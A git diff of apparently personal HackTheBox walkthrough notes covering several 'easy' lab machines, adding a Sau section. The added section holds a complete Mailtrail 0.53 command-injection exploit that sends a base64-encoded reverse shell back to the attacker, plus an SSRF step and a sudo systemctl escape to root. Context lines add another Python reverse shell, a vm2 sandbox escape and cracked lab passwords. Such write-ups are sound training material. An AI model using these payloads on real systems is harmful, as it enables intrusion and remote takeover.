@@ -1,6 +1,6 @@
 # Easy\_machines
 
-### MonitorsTwo
+## MonitorsTwo
 
 1. Observe opened ports
    * `sudo nmap <ip>`
@@ -27,7 +27,7 @@
          > mysql --host=db --user=root --password=root cacti -e "show tables"
      * `mysql --host=db --user=root --password=root cacti -e "show tables"`
 
-### Busqueda
+## Busqueda
 
 1. Reco `sudo nmap -sVC 10.10.11.208`
    * sudo nano /etc/hosts
@@ -72,7 +72,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 
 ![](https://hackmd.io/\_uploads/S13UdFU9h.png)
 
-### MonitorsTwo
+## MonitorsTwo
 
 1. Reco
    * `sudo nmap -sVC 10.10.11.211 -Pn`
@@ -132,7 +132,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
        * NOTHING HAPPENS even after restarting machine
          * cant obtain root flag...
 
-### PC
+## PC
 
 1. Reco
 
@@ -191,7 +191,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
     * cd
     * cat root.txt
 
-### Topology
+## Topology
 
 1. Reco
    * `nmap -sVC 10.10.11.217 -Pn -p-`
@@ -228,9 +228,118 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
      * cd root
        * cat root.txt
 
-### Keeper
+## Sau
 
-#### Reco
+### Reco
+
+#### nmap
+
+`nmap -sVC 10.10.11.224`
+
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+* 22 SSH
+* 80 HTTP (filtered)
+* 55555 unknown - probably HTTP, because it accepts GET requests
+
+#### Website
+
+* by results of nmap scan: -p 55555 is open
+* lets check the URL: http://10.10.11.224:55555
+
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption><p>Website on port 55555</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>Footer of the website</p></figcaption></figure>
+
+### Weaponisation
+
+request-baskets v 1.2.1
+
+* version is vuln to SSRF (Server Side Request Forgery)
+* [https://notes.sjtu.edu.cn/s/MUUhEymt7](https://notes.sjtu.edu.cn/s/MUUhEymt7)
+* our goal is to use request-baskets service which is running on -p 55555 to perform a GET request to the port 80
+
+### Exploitation
+
+#### Create a basket
+
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption><p>new basket "test"</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption><p>header - Configuration Settings</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption><p>Configuration according the the exploit</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption><p>Service running on -p80 is MAILTRAIL v0.53</p></figcaption></figure>
+
+* Mailtrail v0.53 VULN
+  * lets find a vuln to prepare a PoC (proof-of-concept)
+  * RCE (Remote Code Execution)
+
+#### Payload
+
+\#!/bin/python3&#x20;
+
+import sys import os import base64
+
+\#Arguments to be passed
+
+**YOUR\_IP** = sys.argv\[1]
+
+**YOUR\_PORT** = sys.argv\[2]&#x20;
+
+**TARGET\_URL** = sys.argv\[3]
+
+print("\n\[+]Started MailTrail version 0.53 Exploit")
+
+\#Fail-safe for arguments
+
+if len(sys.argv) != 4: print("Usage: python3 mailtrail.py ") sys.exit(-1)
+
+\#Exploit the vulnerbility
+
+def exploit(my\_ip, my\_port, target\_url): # Defining python3 reverse shell payload payload = f'python3 -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("{my\_ip}",{my\_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' # Encoding the payload with base64 encoding encoded\_payload = base64.b64encode(payload.encode()).decode() # curl command that is to be executed on our system to exploit mailtrail command = f"curl '{target\_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'" # Executing it os.system(command)
+
+print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(YOUR\_IP, YOUR\_PORT, TARGET\_URL) print("\n\[+] Successfully Exploited") print("\n\[+] Check your Reverse Shell Listener") except: print("\n\[!] An Error has occured. Try again!")
+
+### User flag
+
+#### Reverse Shell
+
+`nc -nlvp 4444`
+
+`python3 <script_file> <YOUR_IP> <PORT> <TARGET_URL>`&#x20;
+
+`python3 exploit.py 10.10.14.7 4444 http://10.10.11.224:55555/test`
+
+<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption><p>Reverse Shell obtained</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption><p>Path to user flag (/home/puma/user.txt)</p></figcaption></figure>
+
+### Root flag
+
+* Check executable commands
+
+`sudo -l`
+
+<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption><p>systemctl status trail.service</p></figcaption></figure>
+
+* run the possible command
+
+`sudo systemctl status trail.service`
+
+`!sh`
+
+<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+`cd /root`
+
+`cat root.txt`
+
+<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+
+## Keeper
+
+### Reco
 
 * nmap ![](https://hackmd.io/\_uploads/SygLzvjn2.png)
   * 22 SSH
@@ -242,7 +351,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
         * ![](https://hackmd.io/\_uploads/SJCHNvsn2.png)
   * website login accessed: ![](https://hackmd.io/\_uploads/S19u4vs3n.png)
 
-#### Weaponisation
+### Weaponisation
 
 * website is running this one:
   * Best Practical Request Tracker (RT) 4.4.4
@@ -254,14 +363,14 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
     * The attachment has been removed...
     * But there's also mention of another user named `lnorgaard`
 
-#### Exploitation
+### Exploitation
 
 * When we use the `Admin panel to view all Users`, there's a password located within the user's comments
   * access admin -> users ![](https://hackmd.io/\_uploads/SyrpDvon3.png)
   * select the user ![](https://hackmd.io/\_uploads/B1ckOwjhh.png)
   * obtain SSH login credentials ![](https://hackmd.io/\_uploads/rkRSYPjh3.png)
 
-#### User flag
+### User flag
 
 * SSH login w found login creds
   * lnorgaard@10.10.11.227
@@ -269,7 +378,7 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 * ls
 * cat user.txt
 
-#### Root flag
+### Root flag
 
 * ls ![](https://hackmd.io/\_uploads/SyHncvj23.png)
   * KeePassDumpFull.dmp
@@ -278,9 +387,9 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
       * [PoC](https://github.com/vdohney/keepass-password-dumper)
 * [pokracovani](https://github.com/rouvinerh/Gitbook/blob/main/writeups/htb-season-2/keeper.md)
 
-### Codify
+## Codify
 
-#### Reco
+### Reco
 
 * nmap -sVC 10.10.11.239 -Pn
   * 22 SSH
@@ -301,9 +410,9 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
         * hacker could use it to escape the sandbox and execute arbitrary code
       * allows partial code exec on isolated Node.js servers while securing system resources and externam data from unauthorized access
 
-#### Weaponisation
+### Weaponisation
 
-#### Exploitation
+### Exploitation
 
 const {VM} = require("vm2"); const vm = new VM();
 
@@ -323,13 +432,13 @@ console.log(vm.run(code));
       * hashcat -a 0 -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt -w 3
         * PW: spongebob1
 
-#### User flag
+### User flag
 
 * ssh joshua@10.10.11.239
   * PW: spongebob1
   * ls && cat user.txt
 
-#### Root flag
+### Root flag
 
 * cd /opt/scripts && ls
   * cat mysql-backup.sh
